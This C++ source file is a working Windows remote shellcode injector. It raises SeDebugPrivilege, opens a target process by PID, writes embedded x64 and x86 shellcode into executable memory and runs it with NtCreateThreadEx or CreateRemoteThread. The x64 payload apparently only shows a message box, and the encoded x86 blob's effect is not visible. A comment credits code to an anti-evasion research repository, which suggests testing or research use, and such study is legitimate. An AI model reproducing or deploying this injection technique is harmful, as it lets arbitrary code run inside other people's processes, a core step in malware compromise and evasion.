// remote.shellcode.injection.cpp : Defines the entry point for the console application.
//
#include "windows.h"
#include "iostream"

using namespace std;

typedef NTSTATUS(WINAPI *pNtCreateThreadEx)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN DWORD StackZeroBits,
	IN DWORD SizeOfStackCommit,
	IN DWORD SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
	);

int sysError(){

	LPSTR sysMsg = NULL;

	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)&sysMsg,
		256,
		NULL);


	wcout << "  FAILED WITH ERROR CODE: " << sysMsg << endl;

	return ERROR_SUCCESS;
}


int SetPrivDebug(){
	DWORD procPID = 0;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LUID luid;
	TOKEN_PRIVILEGES tp;

	procPID = GetCurrentProcessId();
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, procPID);
	if (hProcess == NULL){
		wcout << "\n  WARNING: OpenProcess() ERROR!" << endl;
		sysError();
		CloseHandle(hProcess);
		return ERROR_SUCCESS;
	}
	BOOL procToken = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
	if (procToken == NULL){
		wcout << "\n  WARNING: OpenProcessToken() ERROR!" << endl;
		sysError();
		CloseHandle(hToken);
		return ERROR_SUCCESS;
	}
	if (!LookupPrivilegeValue(NULL, TEXT("SeDebugPrivilege"), &luid)){
		wcout << "\n  WARNING: LookupPrivilegeValue() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)){
		wcout << "\n  WARNING: AdjustTokenPrivileges() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}
	return ERROR_SUCCESS;
}



int main(int argc, char* argv[])
{
	HANDLE hProcess = NULL;
	int procPID;
	LPVOID memAddress = NULL;
	int wProcMem = 0;
	HANDLE threadID = NULL;
	const char* shellcode;
    int shellcode_size = 0;
   

#ifdef _M_AMD64
    wcout << "\nloading x64 shellcode\n";

    shellcode = "\xfc\x48\x83\xe4\xf0\xeb\x17\x75\x73\x65\x72\x33\x32\x00\x48\x65"
        "\x6c\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x41\x42\x43\x44\x00\xe8\xc8"
        "\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b"
        "\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
        "\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20"
        "\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80"
        "\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18"
        "\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
        "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c"
        "\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59"
        "\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58"
        "\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x48\x8d\x4d\xe4"
        "\x41\xba\x4c\x77\x26\x07\xff\xd5\x41\xba\x45\x83\x56\x07\x48\x31"
        "\xc9\x48\x8d\x55\xeb\x4c\x8d\x45\xeb\x4d\x31\xc9\xff\xd5\x48\x83"
        "\xc4\x48\xc3";
    shellcode_size = 275;

#else

    wcout << "\nloading x86 shellcode\n";

    shellcode = "\xb8\xe0\x20\xa7\x98\xdb\xd1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
        "\x42\x31\x42\x12\x83\xc2\x04\x03\xa2\x2e\x45\x6d\xfb\xc4\x12"
        "\x57\x8f\x3e\xd1\x59\xbd\x8d\x6e\xab\x88\x96\x1b\xba\x3a\xdc"
        "\x6a\x31\xb1\x94\x8e\xc2\x83\x50\x24\xaa\x2b\xea\x0c\x6b\x64"
        "\xf4\x05\x78\x23\x05\x37\x81\x32\x65\x3c\x12\x90\x42\xc9\xae"
        "\xe4\x01\x99\x18\x6c\x17\xc8\xd2\xc6\x0f\x87\xbf\xf6\x2e\x7c"
        "\xdc\xc2\x79\x09\x17\xa1\x7b\xe3\x69\x4a\x4a\x3b\x75\x18\x29"
        "\x7b\xf2\x67\xf3\xb3\xf6\x66\x34\xa0\xfd\x53\xc6\x13\xd6\xd6"
        "\xd7\xd7\x7c\x3c\x19\x03\xe6\xb7\x15\x98\x6c\x9d\x39\x1f\x98"
        "\xaa\x46\x94\x5f\x44\xcf\xee\x7b\x88\xb1\x2d\x31\xb8\x18\x66"
        "\xbf\x5d\xd3\x44\xa8\x13\xaa\x46\xc5\x79\xdb\xc8\xea\x82\xe4"
        "\x7e\x51\x78\xa0\xff\x82\x62\xa5\x78\x2e\x46\x18\x6f\xc1\x79"
        "\x63\x90\x57\xc0\x94\x07\x04\xa6\x84\x96\xbc\x05\xf7\x36\x59"
        "\x01\x82\x35\xc4\xa3\xe4\xe6\x22\x49\x7c\xf0\x7d\xb2\x2b\xf9"
        "\x08\x8e\x84\xba\xa3\xac\x68\x01\x34\xac\x56\x2b\xd3\xad\x69"
        "\x34\xdc\x45\xce\xeb\x03\xb5\x86\x89\x70\x86\x30\x7f\xac\x60"
        "\xe0\x5b\x56\xf9\xfa\xcc\x0e\xd9\xdc\x2c\xc7\x7b\x72\x55\x36"
        "\x13\xf8\xcd\x5d\xc3\x68\x5e\xf1\x73\x49\x6f\xc4\xfb\xc5\xab"
        "\xda\x72\x34\x82\x30\xd6\xe4\xb4\xe6\x29\xda\x06\xc7\x85\x24"
        "\x3d\xcf";
    shellcode_size = 287;
#endif


	SetPrivDebug();
    if (argc > 1){
        procPID = atoi(argv[1]);
    }
    else {
	    wcout << "\nProcess PID:";
	    cin >> procPID;
    }
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procPID);

	if (hProcess == NULL){
		wcout << "\n  WARNING: OpenProcess() ERROR!" << endl;
		sysError();
		CloseHandle(hProcess);
		return ERROR_SUCCESS;
	}

	memAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (memAddress == NULL){
		wcout << "\n  WARNING: VirtualAllocEx() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}

	wProcMem = WriteProcessMemory(hProcess, memAddress, shellcode, shellcode_size, NULL);
	if (wProcMem == NULL){
		wcout << "\n  WARNING: WriteProcessMemory() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}

	// taken from https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/CodeInjection/NtCreateThreadEx.cpp
	HMODULE hNtdll;
	pNtCreateThreadEx NtCreateThreadEx = NULL;
	hNtdll = GetModuleHandleA("ntdll.dll");
	// Get the address NtCreateThreadEx
	printf("\t[+] Looking for NtCreateThreadEx in ntdll\n");
	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL) {
		wcout << "\n  WARNING: GetProcAddress() ERROR!" << endl;
		sysError();
		return FALSE;
	}
	printf("\t[+] Found at %p\n", NtCreateThreadEx);

	int status = 0;
	status = NtCreateThreadEx(&threadID, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)memAddress, memAddress, FALSE, NULL, NULL, NULL, NULL);
	if (status < 0) {
		wcout << "\n  WARNING: NtCreateThreadEx() ERROR!" << endl;
		CloseHandle(threadID);
		threadID = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memAddress, memAddress, 0, NULL);
		if (threadID == NULL){
			wcout << "\n  WARNING: CreateRemoteThready() ERROR!" << endl;
			sysError();
			CloseHandle(threadID);
			return ERROR_SUCCESS;
		}
		else wcout << "CreateThread SUCCESS :)" << endl;

		return FALSE;

	}
	else wcout << "NtCreateThreadEx SUCCESS :)" << endl;

	CloseHandle(hProcess);
	CloseHandle(threadID);

	return ERROR_SUCCESS;
}
